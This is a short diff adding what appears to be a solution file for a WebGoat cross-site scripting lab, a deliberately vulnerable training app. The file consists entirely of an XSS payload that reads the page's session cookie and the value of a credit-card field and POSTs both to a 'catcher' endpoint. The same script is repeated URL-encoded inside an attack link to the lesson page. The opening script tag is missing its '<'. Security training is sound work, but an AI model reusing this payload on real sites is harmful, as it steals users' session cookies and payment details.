@@ -1,0 +1,9 @@
+script>
+    $.ajax({
+        type: "POST",
+        url: "catcher?PROPERTY=yes&cookie=" + document.cookie.split("=")[1] + "&credit=" + document.getElementsByName("field2")[0].value.replace(/\s+/g, '-'),
+    });
+</script>
+
+<!-- Encoded url-->
+http://localhost:8090/WebGoat/start.mvc#attack/1406352188/900?field2=222&field1=%3Cscript%3E%0A%20%20%20%20%24.ajax(%7B%0A%20%20%20%20%20%20%20%20type%3A%20%22POST%22%2C%0A%20%20%20%20%20%20%20%20url%3A%20%22catcher%3FPROPERTY%3Dyes%26cookie%3D%22%20%2B%20document.cookie.split(%22%3D%22)%5B1%5D%20%2B%20%22%26credit%3D%22%20%2B%20document.getElementsByName(%22field2%22)%5B0%5D.value.replace(%2F%5Cs%2B%2Fg%2C%20%27-%27)%2C%0A%20%20%20%20%7D)%3B%0A%3C%2Fscript%3E%0A
